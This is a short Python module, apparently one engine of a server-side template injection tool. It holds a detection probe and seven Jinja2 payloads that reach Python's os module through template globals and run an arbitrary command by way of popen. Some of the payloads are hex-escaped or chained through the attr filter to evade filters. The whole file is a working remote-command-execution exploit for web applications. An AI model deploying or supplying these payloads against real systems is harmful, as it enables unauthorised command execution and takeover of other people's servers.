class jinja:
    def __init__(self):
        self.name = "jinja"
        self.exec = True
        self.download = False

    def payload_test(self):
        return ["(347*21)"]

    def execu(self,cmd,index=-1):
        payload = [
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('"+cmd+"').read() }}",
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.popen('"+cmd+"').read() }}",
        "{{ self._TemplateReference__context.joiner.__init__.__globals__.popen('"+cmd+"').read() }}",
        "{{ self._TemplateReference__context.namespace.__init__.__globals__.popen('"+cmd+"').read() }}",
        "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('"+cmd+"')['read']()}}",
        "{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('"+cmd+"')['read']()}}",
        "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('"+cmd+"')|attr('read')()}}"
        ]
        if index >= 0:
            return payload[index]
        return payload
